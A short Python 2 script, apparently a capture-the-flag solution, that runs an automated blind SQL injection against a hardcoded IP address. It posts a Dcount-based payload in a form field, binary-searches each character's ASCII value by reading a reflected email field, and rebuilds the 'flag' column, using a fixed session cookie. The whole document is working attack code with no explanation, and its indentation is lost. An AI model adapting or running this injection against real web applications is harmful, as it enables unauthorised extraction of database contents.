#!/usr/bin/python2.7
## -*- coding: utf-8 -*-
import requests
import re
import time
URL = "http://106.75.30.27/dochange.php"
HEAD = {
'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
'Cookie':'PHPSESSID=a28qbcrlho5r8ulqjuu7v77na1'
}# headers
p = "1',email=Dcount('flag','ctf','asc(mid(flag,%d,1)) between %d and %d '),info='1)"
def Blind_Inject(N):
i = 0
j = 128
while i<=j:
mid = (i+j)/2
payload = {
'user':p % (N,i,mid)
}
payload
print "now" + str(mid),payload,i,j
requests.post(URL,data=payload,headers=HEAD)
res = requests.get('http://106.75.30.27/?pass=7fcfb78ab3a917bb').content
res = re.findall('name="email" placeholder=".*?" value="."',res,re.I&re.S)[0]
print res[-2],res[-2]=='1'
if (res[-2] == '1'):
j = mid-1
else:i = mid+1
return i
ans =''
for i in range(1,100):
ans += chr(Blind_Inject(i))
print str(i) + ":" + ans
print ans
